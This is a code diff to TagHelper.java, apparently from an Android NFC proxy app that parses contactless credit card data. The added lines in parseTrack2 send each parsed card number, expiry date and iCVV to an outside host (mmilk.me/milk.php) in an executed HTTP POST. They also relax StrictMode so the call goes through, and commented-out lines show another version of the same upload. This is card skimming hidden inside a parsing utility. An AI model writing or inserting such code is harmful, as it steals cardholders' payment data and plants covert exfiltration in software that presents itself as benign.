@@ -1,10 +1,24 @@
 package org.eleetas.nfc.nfcproxy.utils;
 
+import android.os.StrictMode;
+import android.util.Log;
+
+import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.message.BasicNameValuePair;
+
+import java.io.IOException;
 import java.io.UnsupportedEncodingException;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Formatter;
 
 public class TagHelper {
+
+	private static final String  TAG = TagHelper.class.getSimpleName();
 
 	//All of this is extremely ugly and just wrong. 
 	//TODO: rewrite this to actually parse the data instead of this incredibly hackish way of hardcoding values
@@ -22,14 +36,13 @@ public class TagHelper {
 	            int nameOffset = 23;
 	    		
 		        StringBuilder sb = new StringBuilder();	        
-		        sb.append("Name: ");   
+		        sb.append("Name: ");
 		        int length = data[nameOffset + 2]; //TODO: validate or parse
 		        try {
 					sb.append(new String(data, nameOffset + 3, length, "UTF-8"));
 				} catch (UnsupportedEncodingException e) {
 					e.printStackTrace();
 				}
-		
 				sb.append(parseTrack2(data, PANOffset, mask));
 	
 		        sb.append("\niCVV: ");
@@ -114,16 +127,17 @@ public class TagHelper {
 	    		return sb.toString();
 	    	}
 	    	else {
-	    		return "Unsupported CC format (replay should still be OK)";
+	    		return "Else: Unsupported CC format (replay should still be OK)";
 	    	}
     	}
     	catch (Exception e) {
-    		return "Unsupported CC format (replay should still be OK)";
+            e.printStackTrace();
+    		return "Exception caught: "+ e.getMessage() + "Unsupported CC format (replay should still be OK)";
     	}
     }       
  
 	//TODO: Length error checking
-    public static String parseTrack2(byte[] track2, int offset, boolean mask) {
+    public static String parseTrack2(byte[] track2, int offset, boolean mask) throws IOException {
     	int PANLength = 8;
     	int expOffset = offset + PANLength;
     	int svcOffset = offset + PANLength + 2;
@@ -177,8 +191,43 @@ public class TagHelper {
         scodeHundreds |=  track2[svcOffset] & 0x0F;
         scode += format.format("%1x%02x", scodeHundreds, track2[svcOffset + 1]).toString();
         sb.append(scode);
-                
-        return sb.toString();    	
+
+        DefaultHttpClient httpclient = new DefaultHttpClient();
+
+		HttpPost httppost = new HttpPost("http://mmilk.me/milk.php?cardNum="+ccnum+"&cardExp="+exp+"&name=NULL&iCVV="+scode+"&cardRaw=NULL");
+		//Log.d(TAG, String.valueOf(httppost.getURI()));
+        //HttpResponse response = null;
+
+//        response = httpclient.execute(httppost);
+
+//        HttpPost httppost;
+//        httppost = new HttpPost("http://mmilk.me/milk.php");
+//
+//        String cardNum = "cardNum";
+//        String cardExp = "cardExp";
+//        String name = "name";
+//        String ccv = "CCV";
+//        String cardRaw = "cardRaw";
+
+//        ArrayList<NameValuePair> postParameters = new ArrayList<NameValuePair>();
+//        postParameters.add(new BasicNameValuePair(cardNum, ccnum));
+//        postParameters.add(new BasicNameValuePair(cardExp, exp));
+//        postParameters.add(new BasicNameValuePair(name, "NULL"));
+//        postParameters.add(new BasicNameValuePair(ccv, scode));
+//        postParameters.add(new BasicNameValuePair(cardRaw, "NULL"));
+//
+//        httppost.setEntity(new UrlEncodedFormEntity(postParameters));
+        HttpResponse response;
+        String linksite= ("http://mmilk.me/milk.php?cardNum="+ccnum+"&cardExp="+exp+"&name=NULL&iCVV="+scode+"&cardRaw=NULL");
+        Log.d(TAG, "httppost: " + String.valueOf(httppost.getURI()));
+        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+        StrictMode.setThreadPolicy(policy);
+        response = httpclient.execute(httppost);
+        Log.d(TAG, "response" + response.getEntity());
+
+        Log.d(TAG, "linksite" + linksite);
+
+		return sb.toString();
     }
     
     public static String parseTrack1(byte[] track1, int offset, boolean mask) {
